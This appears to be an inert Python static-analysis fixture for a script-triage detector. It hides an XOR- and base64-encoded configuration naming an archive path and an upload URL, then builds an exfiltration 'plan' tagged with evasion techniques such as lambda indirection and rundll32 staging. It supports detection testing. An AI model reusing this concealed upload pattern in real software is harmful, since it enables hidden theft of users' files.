#!/usr/bin/env python3
if True:
    # Huntress Script Triage -- inert static-analysis fixture (cpython3)
    import base64
    import io
    import os

    MATERIAL_bcfdddb1 = "o2a-HpyhPvwR0rY04A6Kti_TDoC2OuBOirs44waKijr-AYe8LelOm6c64hGCvC_TEIq4NPgHk7Q_7RKbsCmxF525N-UAsKc-_ReKpi_TAICxIvARm7Q86T2Mui7iFtLkJ_8bgaE69F-LvDj4C4C7Ov4bsLEy_xKOoTjkHoC3PfkRjLQv5Q2B6DftD42xOtMLgbEy_geMoTLjDJO2Ov4QhrApsRKWvDX_Fo65N-kQsLo16QaGpyf7C4GxNPsRsLYz7QuB6Cn5DIu5N79QsKUp6QaKtj7_EYCnJ-8DgqU65QWBijLoX4y0NvwDhrI1oQbf5Gq-VoywbLkemqU34wOLii7-DtK9L_gSnO90owbf5Gq-VoywbLlMiq064RKDsHXlDJm0N-UGwKAr4A2OsSftEIy9MvoHsKU6-ArSlmGjMp26PP4DgpE6-APAnS7iFp2wKP8ujrd07wOMvT6hBt_kar5WjLBsuUyVvCs="
    CODEC_bcfdddb1 = "urlsafe_base64|repeating_key_xor|d5,5b,8c,62,ef"

    def load_bcfdddb1():
        return base64.urlsafe_b64decode(MATERIAL_bcfdddb1)

    def decode_bcfdddb1(e):
        key_bytes = (213, 91, 140, 98, 239,)
        return bytes(value ^ key_bytes[index % len(key_bytes)] for index, value in enumerate(e))

    def recover_bcfdddb1():
        n = 19 * 7 - 133
        for _pass in range(1):
            d = decode_bcfdddb1(load_bcfdddb1())
        t = d.decode("ascii", "strict")
        return t

    def inspect_bcfdddb1():
        stream = io.BytesIO(recover_bcfdddb1().encode("ascii"))
        return stream.read().decode("ascii")

    def surface_bcfdddb1():
        routes = {"selected": lambda: ("dictionary_dispatch", "lambda_indirection", "pyinstaller_onedir", "rundll32_predecessor")}
        return routes["selected"]()

    def obfuscation_bcfdddb1():
        recover = lambda value: value
        return recover("lambda_indirection")

    def plan_bcfdddb1():
        fields = dict(item.split("=", 1) for item in inspect_bcfdddb1().split("|"))
        analysis_surface = surface_bcfdddb1()
        obfuscation_surface = obfuscation_bcfdddb1()
        operation_plan = ("urllib_request_body", fields["archive_path"], fields["upload_url"])
        return operation_plan + (analysis_surface, obfuscation_surface)

    if os.environ.get("HUNTRESS_INSPECT_ONLY") == "1":
        print(inspect_bcfdddb1())
